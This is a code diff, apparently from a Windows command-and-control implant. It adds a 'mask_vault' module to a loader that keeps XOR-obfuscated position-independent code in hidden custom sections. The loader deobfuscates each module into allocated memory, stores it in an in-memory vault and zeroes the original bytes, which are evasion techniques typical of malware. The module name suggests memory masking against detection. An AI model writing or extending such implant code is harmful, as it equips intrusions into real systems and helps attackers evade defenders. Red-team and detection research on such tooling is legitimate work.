@@ -10,6 +10,7 @@ WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, 
 
 char __CHECKIN_PICO__[0] __attribute__((section("pico_checkin")));
 char __WHOAMI_PICO__[0] __attribute__((section("pico_whoami")));
+char __MASK_VAULT_PICO__[0] __attribute__((section("pico_mask_vault")));
 
 WIN32FUNCS resolve_pico_functions() {
 	WIN32FUNCS funcs;
@@ -30,6 +31,10 @@ char * find_whoami_pico() {
     return (char *)&__WHOAMI_PICO__;
 }
 
+char *find_mask_vault_pico() {
+	return (char *)&__MASK_VAULT_PICO__;
+}
+
 char *deobfuscate_pico(_EMBEDDED_PICO *pico, char *key, int keylen) {
 	char *output = KERNEL32$VirtualAlloc(0, pico->length, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 	xorify(output, pico->value, pico->length, key, keylen);
@@ -42,26 +47,32 @@ BuiltinPicos load_builtin_picos(DataVault *vault, char *key, int keylen) {
 	// Load default names for the built-in PICOs.
 	picos.checkin = "_builtin_checkin";
 	picos.whoami = "_builtin_whoami";
+	picos.mask_vault = "_builtin_mask_vault";
 	
 	// Get embedded and obfuscated PICO data.
 	_EMBEDDED_PICO *checkin = (_EMBEDDED_PICO *) find_checkin_pico();
 	_EMBEDDED_PICO *whoami = (_EMBEDDED_PICO *) find_whoami_pico();
+	_EMBEDDED_PICO *mask_vault = (_EMBEDDED_PICO *) find_mask_vault_pico();
 	
 	// Deobfuscate PICOs.
 	char *checkin_buf = deobfuscate_pico(checkin, key, keylen);
 	char *whoami_buf = deobfuscate_pico(whoami, key, keylen);
+	char *mask_vault_buf = deobfuscate_pico(mask_vault, key, keylen);
 	
 	// Copy deobfuscated PICOs into the in-memory vault.
 	add_to_vault(vault, picos.checkin, checkin_buf, checkin->length);
 	add_to_vault(vault, picos.whoami, whoami_buf, whoami->length);
+	add_to_vault(vault, picos.mask_vault, mask_vault_buf, mask_vault->length);
 	
 	// Free temporary buffers.
 	KERNEL32$VirtualFree(checkin_buf, 0, MEM_RELEASE);
 	KERNEL32$VirtualFree(whoami_buf, 0, MEM_RELEASE);
+	KERNEL32$VirtualFree(mask_vault_buf, 0, MEM_RELEASE);
 	
 	// Zero out the obfuscated PICO data.
 	for (int i = 0; i < checkin->length; i++) { checkin->value[i] = 0; }
 	for (int i = 0; i < whoami->length; i++) { whoami->value[i] = 0; }
+	for (int i = 0; i < mask_vault->length; i++) { mask_vault->value[i] = 0; }
 	
 	return picos;
 }
